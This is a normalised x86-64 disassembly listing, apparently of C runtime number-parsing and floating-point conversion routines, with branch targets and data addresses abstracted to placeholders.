pop r13
pop r12
retn
movsxd r12 ebx
mov rax [ rw-data ]
cmp [ rax + r12 * 8 ] 0x0
je r-xdata
inc ebx
jmp r-xdata
mov rdx [ rax + r12 * 8 ]
test [ rdx + 0x18 ] 0x83
je r-xdata
mov [ rsp + 0x20 ] ebx
cmp ebx [ rw-data ]
jge r-xdata
mov ecx ebx
call sub_18002f200
nop
mov rax [ rw-data ]
mov rcx [ rax + r12 * 8 ]
test [ rcx + 0x18 ] 0x83
je r-xdata
mov rdx [ rw-data ]
mov rdx [ rdx + r12 * 8 ]
mov ecx ebx
call sub_18002f280
cmp r13d 0x1
jne r-xdata
test r13d r13d
jne r-xdata
call sub_1800311b0
cmp eax r15d
je r-xdata
test [ rcx + 0x18 ] 0x2
je r-xdata
inc esi
mov [ rsp + 0x24 ] esi
jmp r-xdata
call sub_1800311b0
cmp eax r15d
cmove edi r15d
mov [ rsp + 0x28 ] edi
sub_1800312f4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push rbp
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x40
mov r15 rdx
mov rdx rcx
lea rcx [ rbp - 0x20 ]
mov r13d r9d
mov r14 r8
call sub_1800221bc
test r14 r14
je r-xdata
test r15 r15
jne r-xdata
mov [ r14 ] r15
test r13d r13d
je r-xdata
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
cmp [ rbp - 0x8 ] 0x0
jmp r-xdata
mov r12b [ r15 ]
mov r8 [ rbp - 0x20 ]
xor edi edi
lea rbx [ r15 + 0x1 ]
cmp r13d 0x2
jl r-xdata
je r-xdata
mov rax [ r8 + 0x140 ]
movzx ecx r12b
movzx eax [ rax + rcx * 2 ]
and eax 0x8
lea r8 [ rbp - 0x20 ]
movzx ecx r12b
mov edx 0x8
call sub_18002b270
mov r8 [ rbp - 0x20 ]
jmp r-xdata
cmp r13d 0x24
jg r-xdata
xor eax eax
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
mov esi [ rbp + 0x50 ]
cmp r12b 0x2d
jne r-xdata
mov r12b [ rbx ]
inc rbx
jmp r-xdata
test eax eax
je r-xdata
cmp r12b 0x2b
jne r-xdata
or esi 0x2
jmp r-xdata
cmp [ r8 + 0x10c ] 0x1
jle r-xdata
test r13d r13d
js r-xdata
mov r12b [ rbx ]
inc rbx
test r14 r14
je r-xdata
cmp r13d 0x1
je r-xdata
cmp [ rbp - 0x8 ] dil
mov [ r14 ] r15
cmp r13d 0x24
jg r-xdata
test r13d r13d
jne r-xdata
cmp r13d 0x10
jne r-xdata
cmp r12b 0x30
je r-xdata
mov r10 [ r8 + 0x140 ]
xor edx edx
or eax 0xffffffff
div r13d
mov r9d eax
cmp r12b 0x30
jne r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r13d 0xa
jmp r-xdata
and r8d 0x103
je r-xdata
movsx ecx r12b
sub ecx 0x30
jmp r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r13d 0x10
jmp r-xdata
cmp [ rbx ] 0x58
je r-xdata
dec rbx
test sil 0x8
jne r-xdata
lea eax [ r12 - 0x61 ]
movsx ecx r12b
cmp al 0x19
ja r-xdata
cmp ecx r13d
jae r-xdata
mov r12b [ rbx + 0x1 ]
add rbx 0x2
cmp [ rbx ] 0x58
jne r-xdata
mov r13d 0x8
jmp r-xdata
mov r12d 0x7fffffff
test sil 0x4
jne r-xdata
test r14 r14
cmovne rbx r15
xor edi edi
jmp r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or esi 0x8
cmp edi r9d
jb r-xdata
call sub_180022de4
mov [ rax ] 0x22
test sil 0x1
je r-xdata
test sil 0x1
jne r-xdata
test r14 r14
je r-xdata
imul edi r13d
add edi ecx
jne r-xdata
mov al sil
and al 0x2
neg al
sbb edi edi
neg edi
add edi r12d
or edi 0xffffffff
jmp r-xdata
mov eax esi
and eax 0x2
je r-xdata
test sil 0x2
je r-xdata
mov [ r14 ] rbx
movzx ecx r12b
movzx r8d [ r10 + rcx * 2 ]
mov ecx r8d
and ecx 0x4
je r-xdata
or esi 0x4
test r14 r14
jne r-xdata
cmp ecx edx
jbe r-xdata
test eax eax
jne r-xdata
cmp edi 0x80000000
ja r-xdata
cmp [ rbp - 0x8 ] 0x0
je r-xdata
neg edi
mov r12b [ rbx ]
inc rbx
jmp r-xdata
cmp edi r12d
jbe r-xdata
mov eax edi
jmp r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
sub_180031560
sub rsp 0x38
xor eax eax
mov r9d r8d
mov r8 rdx
cmp [ rw-data ] eax
mov [ rsp + 0x20 ] eax
mov rdx rcx
jne r-xdata
xor ecx ecx
lea rcx [ rw-data ]
jmp r-xdata
call sub_1800312f4
add rsp 0x38
retn
sub_180031590
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x60
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x10 ] rax
movzx eax [ rcx + 0xa ]
xor ebx ebx
mov r15d 0x1f
mov edi eax
and eax 0x8000
mov [ rbp - 0x38 ] rdx
mov [ rbp - 0x3c ] eax
mov eax [ rcx + 0x6 ]
and edi 0x7fff
mov [ rbp - 0x30 ] eax
mov eax [ rcx + 0x2 ]
sub edi 0x3fff
mov [ rbp - 0x2c ] eax
movzx eax [ rcx ]
lea esi [ rbx + 0x1 ]
shl eax 0x10
lea r12d [ r15 - 0x1c ]
mov [ rbp - 0x28 ] eax
cmp edi 0xffffc001
jne r-xdata
mov r9d [ rw-data ]
lea rcx [ rbp - 0x30 ]
mov r11d r15d
mov rax [ rcx ]
or r14d 0xffffffff
mov [ rbp - 0x40 ] edi
mov [ rbp - 0x20 ] rax
mov eax [ rcx + 0x8 ]
mov r13d ebx
mov [ rbp - 0x18 ] eax
mov eax r9d
cdq
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sub eax edx
sar r10d 0x5
sub r11d eax
movsxd rax r10d
mov ecx [ rbp + rax * 4 - 0x30 ]
bt ecx r11d
jae r-xdata
mov r8d ebx
mov eax ebx
mov ecx r11d
mov eax r14d
shl eax cl
movsxd rcx r10d
and [ rbp + rcx * 4 - 0x30 ] eax
lea eax [ r10 + 0x1 ]
movsxd rdx eax
cmp rdx r12
jge r-xdata
mov ecx r11d
mov eax r14d
movsxd r8 r10d
shl eax cl
not eax
test [ rbp + r8 * 4 - 0x30 ] eax
jne r-xdata
mov [ rbp - 0x30 ] rbx
mov [ rbp - 0x28 ] ebx
mov ebx 0x2
jmp r-xdata
add rax rsi
cmp rax r12
jl r-xdata
test r13d r13d
je r-xdata
lea rcx [ rbp + rdx * 4 - 0x30 ]
mov r8 r12
sub r8 rdx
xor edx edx
shl r8 0x2
call sub_180021150
lea eax [ r9 - 0x1 ]
mov ecx r15d
cdq
and edx r15d
add eax edx
mov r8d eax
and eax r15d
sub eax edx
sar r8d 0x5
mov edx esi
sub ecx eax
movsxd r9 r8d
mov eax [ rbp + r9 * 4 - 0x30 ]
shl edx cl
lea ecx [ rax + rdx ]
cmp ecx eax
jb r-xdata
lea eax [ rsi + r8 ]
cdqe
jmp r-xdata
sub r15d [ rw-data ]
mov cl r15b
shl r8d cl
neg [ rbp - 0x3c ]
sbb eax eax
and eax 0x80000000
or r8d eax
mov eax [ rw-data ]
or r8d [ rbp - 0x30 ]
cmp eax 0x40
jne r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov eax edx
sub eax [ rw-data ]
cmp edi eax
jge r-xdata
add edi esi
mov r13d esi
cmp ecx edx
jae r-xdata
cmp rax r12
jl r-xdata
cmp eax 0x20
jne r-xdata
mov eax [ rbp - 0x2c ]
mov [ rdx + 0x4 ] r8d
mov [ rdx ] eax
jmp r-xdata
cmp edi edx
jg r-xdata
mov [ rbp - 0x30 ] rbx
mov [ rbp - 0x28 ] ebx
mov r8d ebx
mov ebx 0x2
jmp r-xdata
test r13d r13d
je r-xdata
sub r8d esi
mov [ rbp + r9 * 4 - 0x30 ] ecx
movsxd rdx r8d
js r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
mov eax ebx
mov rcx [ rbp - 0x10 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0xb0 ]
add rsp 0x60
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov [ rdx ] r8d
mov eax [ rw-data ]
cdq
and edx r15d
add eax edx
cmp edi [ rw-data ]
jl r-xdata
sub edx [ rbp - 0x40 ]
lea rax [ rbp - 0x20 ]
mov edi r14d
mov rcx [ rax ]
mov r9d ebx
lea r8 [ rbp - 0x30 ]
mov [ rbp - 0x30 ] rcx
mov ecx [ rax + 0x8 ]
mov eax edx
cdq
mov [ rbp - 0x28 ] ecx
mov r10 r12
and edx r15d
add eax edx
mov r11d eax
and eax r15d
mov r15d 0x20
sub eax edx
sar r11d 0x5
mov ecx eax
mov r13d eax
shl edi cl
sub r15d eax
not edi
mov rdx [ rbp - 0x38 ]
mov eax [ rbp + rdx * 4 - 0x30 ]
mov r13d ebx
lea r8d [ rax + 0x1 ]
cmp r8d eax
jb r-xdata
add rax rsi
mov r8d [ rw-data ]
btr [ rbp - 0x30 ] 0x1f
mov r11d eax
and eax r15d
add r8d edi
mov r13d 0x20
sub eax edx
sar r11d 0x5
mov r10d ebx
mov ecx eax
mov edi eax
lea r9 [ rbp - 0x30 ]
shl r14d cl
sub r13d eax
not r14d
mov r10d eax
and eax r15d
mov edi 0x20
sub eax edx
mov [ rbp - 0x30 ] rbx
bts [ rbp - 0x30 ] 0x1f
mov ecx eax
sar r10d 0x5
mov [ rbp - 0x28 ] ebx
shl r14d cl
mov r11d eax
mov r9d ebx
not r14d
sub edi eax
lea r8 [ rbp - 0x30 ]
mov edx [ r8 ]
mov ecx r13d
mov eax edx
shr edx cl
mov ecx r15d
or edx r9d
and eax edi
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r10 rsi
jne r-xdata
lea edi [ r10 + 0x2 ]
movsxd r10 r11d
mov r9 r10
mov r8d edi
neg r9
mov r13d esi
cmp r8d esi
jae r-xdata
mov edx [ r9 ]
mov ecx edi
mov eax edx
shr edx cl
mov ecx r13d
or edx r10d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r9 ] edx
add r9 0x4
mov r10d [ rbp - 0x40 ]
shl r10d cl
sub r12 rsi
jne r-xdata
movsxd r10 r11d
lea edi [ r12 + 0x2 ]
mov r9 r10
neg r9
mov edx [ r8 ]
mov ecx r11d
mov eax edx
shr edx cl
mov ecx edi
or edx r9d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r12 rsi
jne r-xdata
movsxd r9 r10d
lea edi [ r12 + 0x2 ]
mov r8 r9
neg r8
mov [ rbp + r8 * 4 - 0x30 ] ebx
mov rdx r8
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
mov [ rbp + rdx * 4 - 0x30 ] r8d
sub rdx rsi
jns r-xdata
mov [ rbp + rdi * 4 - 0x30 ] ebx
mov rdx rdi
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
mov [ rbp + rdi * 4 - 0x30 ] ebx
mov rdx rdi
shl rdx 0x2
lea rax [ rdx + r8 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
cmp r8 r10
jl r-xdata
mov r9d [ rw-data ]
mov r13d 0x1f
mov eax r9d
mov r11d r13d
cdq
and edx r13d
add eax edx
mov r10d eax
and eax r13d
sar r10d 0x5
sub eax edx
movsxd r15 r10d
sub r11d eax
mov ecx [ rbp + r15 * 4 - 0x30 ]
bt ecx r11d
jae r-xdata
sub r8 rsi
jns r-xdata
cmp rdi r10
jl r-xdata
sub rdi rsi
jns r-xdata
cmp rdi r9
jl r-xdata
mov r8d [ rw-data ]
mov ebx esi
add r8d [ rw-data ]
jmp r-xdata
sub rdi rsi
jns r-xdata
mov ecx r11d
mov eax r14d
shl eax cl
and [ rbp + r15 * 4 - 0x30 ] eax
lea eax [ r10 + 0x1 ]
movsxd rdx eax
cmp rdx r12
jge r-xdata
mov ecx r11d
mov eax r14d
movsxd r8 r10d
shl eax cl
not eax
test [ rbp + r8 * 4 - 0x30 ] eax
jne r-xdata
mov eax [ rw-data ]
mov r15d 0x1f
mov r9d ebx
inc eax
lea r13d [ r15 + 0x1 ]
lea r8 [ rbp - 0x30 ]
cdq
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sub eax edx
sar r10d 0x5
mov ecx eax
mov r11d eax
shl r14d cl
sub r13d eax
not r14d
lea rcx [ rbp + rdx * 4 - 0x30 ]
mov r8 r12
sub r8 rdx
xor edx edx
shl r8 0x2
call sub_180021150
lea eax [ r9 - 0x1 ]
mov ecx r13d
mov r9d esi
cdq
and edx r13d
add eax edx
mov r8d eax
and eax r13d
sub eax edx
sar r8d 0x5
sub ecx eax
movsxd r13 r8d
mov eax [ rbp + r13 * 4 - 0x30 ]
shl r9d cl
mov ecx ebx
lea edx [ rax + r9 ]
cmp edx eax
jb r-xdata
lea eax [ rsi + r8 ]
cdqe
jmp r-xdata
mov edx [ r8 ]
mov ecx r11d
mov eax edx
shr edx cl
mov ecx r13d
or edx r9d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r12 rsi
jne r-xdata
movsxd r10 r10d
mov r8 rdi
mov r9 r10
neg r9
mov ecx esi
cmp edx r9d
jae r-xdata
cmp rax r12
jl r-xdata
mov [ rbp + r8 * 4 - 0x30 ] ebx
mov rdx r8
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
test ecx ecx
je r-xdata
sub r8d esi
mov [ rbp + r13 * 4 - 0x30 ] edx
movsxd rdx r8d
js r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
cmp r8 r10
jl r-xdata
mov r8d ebx
mov ebx edi
jmp r-xdata
sub r8 rsi
jns r-xdata
mov eax [ rbp + rdx * 4 - 0x30 ]
mov ecx ebx
lea r8d [ rax + 0x1 ]
cmp r8d eax
jb r-xdata
add rax rsi
mov ecx esi
cmp r8d esi
jae r-xdata
mov [ rbp + rdx * 4 - 0x30 ] r8d
sub rdx rsi
jns r-xdata
sub_180031b5c
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x60
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x10 ] rax
movzx eax [ rcx + 0xa ]
xor ebx ebx
mov r15d 0x1f
mov edi eax
and eax 0x8000
mov [ rbp - 0x38 ] rdx
mov [ rbp - 0x3c ] eax
mov eax [ rcx + 0x6 ]
and edi 0x7fff
mov [ rbp - 0x30 ] eax
mov eax [ rcx + 0x2 ]
sub edi 0x3fff
mov [ rbp - 0x2c ] eax
movzx eax [ rcx ]
lea esi [ rbx + 0x1 ]
shl eax 0x10
lea r12d [ r15 - 0x1c ]
mov [ rbp - 0x28 ] eax
cmp edi 0xffffc001
jne r-xdata
mov r9d [ rw-data ]
lea rcx [ rbp - 0x30 ]
mov r11d r15d
mov rax [ rcx ]
or r14d 0xffffffff
mov [ rbp - 0x40 ] edi
mov [ rbp - 0x20 ] rax
mov eax [ rcx + 0x8 ]
mov r13d ebx
mov [ rbp - 0x18 ] eax
mov eax r9d
cdq
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sub eax edx
sar r10d 0x5
sub r11d eax
movsxd rax r10d
mov ecx [ rbp + rax * 4 - 0x30 ]
bt ecx r11d
jae r-xdata
mov r8d ebx
mov eax ebx
mov ecx r11d
mov eax r14d
shl eax cl
movsxd rcx r10d
and [ rbp + rcx * 4 - 0x30 ] eax
lea eax [ r10 + 0x1 ]
movsxd rdx eax
cmp rdx r12
jge r-xdata
mov ecx r11d
mov eax r14d
movsxd r8 r10d
shl eax cl
not eax
test [ rbp + r8 * 4 - 0x30 ] eax
jne r-xdata
mov [ rbp - 0x30 ] rbx
mov [ rbp - 0x28 ] ebx
mov ebx 0x2
jmp r-xdata
add rax rsi
cmp rax r12
jl r-xdata
test r13d r13d
je r-xdata
lea rcx [ rbp + rdx * 4 - 0x30 ]
mov r8 r12
sub r8 rdx
xor edx edx
shl r8 0x2
call sub_180021150
lea eax [ r9 - 0x1 ]
mov ecx r15d
cdq
and edx r15d
add eax edx
mov r8d eax
and eax r15d
sub eax edx
sar r8d 0x5
mov edx esi
sub ecx eax
movsxd r9 r8d
mov eax [ rbp + r9 * 4 - 0x30 ]
shl edx cl
lea ecx [ rax + rdx ]
cmp ecx eax
jb r-xdata
lea eax [ rsi + r8 ]
cdqe
jmp r-xdata
sub r15d [ rw-data ]
mov cl r15b
shl r8d cl
neg [ rbp - 0x3c ]
sbb eax eax
and eax 0x80000000
or r8d eax
mov eax [ rw-data ]
or r8d [ rbp - 0x30 ]
cmp eax 0x40
jne r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov eax edx
sub eax [ rw-data ]
cmp edi eax
jge r-xdata
add edi esi
mov r13d esi
cmp ecx edx
jae r-xdata
cmp rax r12
jl r-xdata
cmp eax 0x20
jne r-xdata
mov eax [ rbp - 0x2c ]
mov [ rdx + 0x4 ] r8d
mov [ rdx ] eax
jmp r-xdata
cmp edi edx
jg r-xdata
mov [ rbp - 0x30 ] rbx
mov [ rbp - 0x28 ] ebx
mov r8d ebx
mov ebx 0x2
jmp r-xdata
test r13d r13d
je r-xdata
sub r8d esi
mov [ rbp + r9 * 4 - 0x30 ] ecx
movsxd rdx r8d
js r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
mov eax ebx
mov rcx [ rbp - 0x10 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0xb0 ]
add rsp 0x60
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov [ rdx ] r8d
mov eax [ rw-data ]
cdq
and edx r15d
add eax edx
cmp edi [ rw-data ]
jl r-xdata
sub edx [ rbp - 0x40 ]
lea rax [ rbp - 0x20 ]
mov edi r14d
mov rcx [ rax ]
mov r9d ebx
lea r8 [ rbp - 0x30 ]
mov [ rbp - 0x30 ] rcx
mov ecx [ rax + 0x8 ]
mov eax edx
cdq
mov [ rbp - 0x28 ] ecx
mov r10 r12
and edx r15d
add eax edx
mov r11d eax
and eax r15d
mov r15d 0x20
sub eax edx
sar r11d 0x5
mov ecx eax
mov r13d eax
shl edi cl
sub r15d eax
not edi
mov rdx [ rbp - 0x38 ]
mov eax [ rbp + rdx * 4 - 0x30 ]
mov r13d ebx
lea r8d [ rax + 0x1 ]
cmp r8d eax
jb r-xdata
add rax rsi
mov r8d [ rw-data ]
btr [ rbp - 0x30 ] 0x1f
mov r11d eax
and eax r15d
add r8d edi
mov r13d 0x20
sub eax edx
sar r11d 0x5
mov r10d ebx
mov ecx eax
mov edi eax
lea r9 [ rbp - 0x30 ]
shl r14d cl
sub r13d eax
not r14d
mov r10d eax
and eax r15d
mov edi 0x20
sub eax edx
mov [ rbp - 0x30 ] rbx
bts [ rbp - 0x30 ] 0x1f
mov ecx eax
sar r10d 0x5
mov [ rbp - 0x28 ] ebx
shl r14d cl
mov r11d eax
mov r9d ebx
not r14d
sub edi eax
lea r8 [ rbp - 0x30 ]
mov edx [ r8 ]
mov ecx r13d
mov eax edx
shr edx cl
mov ecx r15d
or edx r9d
and eax edi
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r10 rsi
jne r-xdata
lea edi [ r10 + 0x2 ]
movsxd r10 r11d
mov r9 r10
mov r8d edi
neg r9
mov r13d esi
cmp r8d esi
jae r-xdata
mov edx [ r9 ]
mov ecx edi
mov eax edx
shr edx cl
mov ecx r13d
or edx r10d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r9 ] edx
add r9 0x4
mov r10d [ rbp - 0x40 ]
shl r10d cl
sub r12 rsi
jne r-xdata
movsxd r10 r11d
lea edi [ r12 + 0x2 ]
mov r9 r10
neg r9
mov edx [ r8 ]
mov ecx r11d
mov eax edx
shr edx cl
mov ecx edi
or edx r9d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r12 rsi
jne r-xdata
movsxd r9 r10d
lea edi [ r12 + 0x2 ]
mov r8 r9
neg r8
mov [ rbp + r8 * 4 - 0x30 ] ebx
mov rdx r8
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
mov [ rbp + rdx * 4 - 0x30 ] r8d
sub rdx rsi
jns r-xdata
mov [ rbp + rdi * 4 - 0x30 ] ebx
mov rdx rdi
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
mov [ rbp + rdi * 4 - 0x30 ] ebx
mov rdx rdi
shl rdx 0x2
lea rax [ rdx + r8 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
cmp r8 r10
jl r-xdata
mov r9d [ rw-data ]
mov r13d 0x1f
mov eax r9d
mov r11d r13d
cdq
and edx r13d
add eax edx
mov r10d eax
and eax r13d
sar r10d 0x5
sub eax edx
movsxd r15 r10d
sub r11d eax
mov ecx [ rbp + r15 * 4 - 0x30 ]
bt ecx r11d
jae r-xdata
sub r8 rsi
jns r-xdata
cmp rdi r10
jl r-xdata
sub rdi rsi
jns r-xdata
cmp rdi r9
jl r-xdata
mov r8d [ rw-data ]
mov ebx esi
add r8d [ rw-data ]
jmp r-xdata
sub rdi rsi
jns r-xdata
mov ecx r11d
mov eax r14d
shl eax cl
and [ rbp + r15 * 4 - 0x30 ] eax
lea eax [ r10 + 0x1 ]
movsxd rdx eax
cmp rdx r12
jge r-xdata
mov ecx r11d
mov eax r14d
movsxd r8 r10d
shl eax cl
not eax
test [ rbp + r8 * 4 - 0x30 ] eax
jne r-xdata
mov eax [ rw-data ]
mov r15d 0x1f
mov r9d ebx
inc eax
lea r13d [ r15 + 0x1 ]
lea r8 [ rbp - 0x30 ]
cdq
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sub eax edx
sar r10d 0x5
mov ecx eax
mov r11d eax
shl r14d cl
sub r13d eax
not r14d
lea rcx [ rbp + rdx * 4 - 0x30 ]
mov r8 r12
sub r8 rdx
xor edx edx
shl r8 0x2
call sub_180021150
lea eax [ r9 - 0x1 ]
mov ecx r13d
mov r9d esi
cdq
and edx r13d
add eax edx
mov r8d eax
and eax r13d
sub eax edx
sar r8d 0x5
sub ecx eax
movsxd r13 r8d
mov eax [ rbp + r13 * 4 - 0x30 ]
shl r9d cl
mov ecx ebx
lea edx [ rax + r9 ]
cmp edx eax
jb r-xdata
lea eax [ rsi + r8 ]
cdqe
jmp r-xdata
mov edx [ r8 ]
mov ecx r11d
mov eax edx
shr edx cl
mov ecx r13d
or edx r9d
and eax r14d
mov [ rbp - 0x40 ] eax
mov [ r8 ] edx
add r8 0x4
mov r9d [ rbp - 0x40 ]
shl r9d cl
sub r12 rsi
jne r-xdata
movsxd r10 r10d
mov r8 rdi
mov r9 r10
neg r9
mov ecx esi
cmp edx r9d
jae r-xdata
cmp rax r12
jl r-xdata
mov [ rbp + r8 * 4 - 0x30 ] ebx
mov rdx r8
shl rdx 0x2
lea rax [ rdx + r9 * 4 ]
mov ecx [ rbp + rax - 0x30 ]
mov [ rbp + rdx - 0x30 ] ecx
jmp r-xdata
test ecx ecx
je r-xdata
sub r8d esi
mov [ rbp + r13 * 4 - 0x30 ] edx
movsxd rdx r8d
js r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
cmp r8 r10
jl r-xdata
mov r8d ebx
mov ebx edi
jmp r-xdata
sub r8 rsi
jns r-xdata
mov eax [ rbp + rdx * 4 - 0x30 ]
mov ecx ebx
lea r8d [ rax + 0x1 ]
cmp r8d eax
jb r-xdata
add rax rsi
mov ecx esi
cmp r8d esi
jae r-xdata
mov [ rbp + rdx * 4 - 0x30 ] r8d
sub rdx rsi
jns r-xdata
sub_180032128
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x7 ]
sub rsp 0xa0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x1 ] rax
mov r13 [ rbp + 0x7f ]
xor ebx ebx
mov [ rbp - 0x71 ] r9d
lea r9d [ rbx + 0x1 ]
mov [ rbp - 0x59 ] rcx
mov [ rbp - 0x69 ] rdx
lea r10 [ rbp - 0x21 ]
mov [ rbp - 0x6d ] bx
mov edi ebx
mov [ rbp - 0x75 ] r9d
mov r14d ebx
mov [ rbp - 0x79 ] ebx
mov r15d ebx
mov esi ebx
mov r12d ebx
mov ecx ebx
test r13 r13
jne r-xdata
mov r11 r8
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
xor eax eax
jmp r-xdata
add r8 r9
jmp r-xdata
cmp al 0x9
je r-xdata
mov rcx [ rbp - 0x1 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0xf0 ]
add rsp 0xa0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov al [ r8 ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov dl [ r8 ]
add r8 r9
cmp ecx 0x5
jg r-xdata
mov r9d ecx
sub r9d 0x6
je r-xdata
je r-xdata
lea eax [ rdx - 0x31 ]
lea r11 [ r8 - 0x2 ]
cmp al 0x8
jbe r-xdata
dec r9d
je r-xdata
sub dl 0x30
mov [ rbp - 0x79 ] r9d
cmp dl 0x9
ja r-xdata
mov r9d ecx
test ecx ecx
je r-xdata
mov ecx 0x9
jmp r-xdata
cmp dl 0x2b
je r-xdata
lea eax [ rdx - 0x31 ]
cmp al 0x8
ja r-xdata
dec r9d
je r-xdata
mov r8 r11
jmp r-xdata
mov ecx 0x4
jmp r-xdata
lea eax [ rdx - 0x31 ]
cmp al 0x8
jbe r-xdata
dec r9d
je r-xdata
mov r9d 0x1
mov ecx 0x7
cmp dl 0x2d
je r-xdata
cmp dl 0x30
jne r-xdata
mov r9d 0x1
mov r15d r9d
jmp r-xdata
dec r9d
je r-xdata
mov rax [ rbp - 0x69 ]
mov [ rax ] r8
test r14d r14d
je r-xdata
sub r8 r9
jmp r-xdata
mov ecx 0x3
mov rax [ r13 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
cmp dl [ rax ]
je r-xdata
lea eax [ rdx - 0x31 ]
mov r9d 0x1
mov r14d r9d
cmp al 0x8
ja r-xdata
dec r9d
je r-xdata
mov r9d 0x1
jmp r-xdata
or [ rbp - 0x75 ] 0xffffffff
mov ecx 0x7
jmp r-xdata
jmp r-xdata
mov r8 r11
mov ecx 0x8
jmp r-xdata
cmp dl 0x30
je r-xdata
mov r9d 0x1
mov r11b 0x30
mov r15d r9d
jmp r-xdata
cmp r9d 0x2
jne r-xdata
movzx edx bx
movzx eax bx
mov edi ebx
mov ecx ebx
mov ebx 0x4
cmp edi 0x18
jbe r-xdata
mov ecx 0x5
cmp dl 0x2b
je r-xdata
mov rax [ r13 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
cmp dl [ rax ]
je r-xdata
lea ecx [ r9 + 0x2 ]
jmp r-xdata
lea eax [ rdx - 0x31 ]
cmp al 0x8
ja r-xdata
dec r9d
je r-xdata
mov r9d 0x1
jmp r-xdata
mov dl [ r8 ]
add r8 r9
sub dl 0x31
cmp dl 0x8
ja r-xdata
cmp dl r11b
jge r-xdata
cmp ecx 0xa
je r-xdata
cmp [ rbp + 0x77 ] ebx
je r-xdata
test edi edi
jne r-xdata
mov al [ rbp - 0xa ]
cmp al 0x5
jl r-xdata
mov ecx 0x2
mov [ rbp - 0x6d ] bx
jmp r-xdata
cmp dl 0x2d
je r-xdata
mov ecx 0x4
jmp r-xdata
cmp dl 0x2b
je r-xdata
mov rax [ r13 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
cmp dl [ rax ]
jne r-xdata
mov r9d 0x1
mov al 0x30
mov r14d r9d
jmp r-xdata
dec r9d
jne r-xdata
sub r8 r9
jmp r-xdata
mov ecx 0x9
jmp r-xdata
cmp dl 0x39
jg r-xdata
jmp r-xdata
mov r9d 0x1
lea r11 [ r8 - 0x1 ]
cmp dl 0x2b
je r-xdata
sub r10 r9
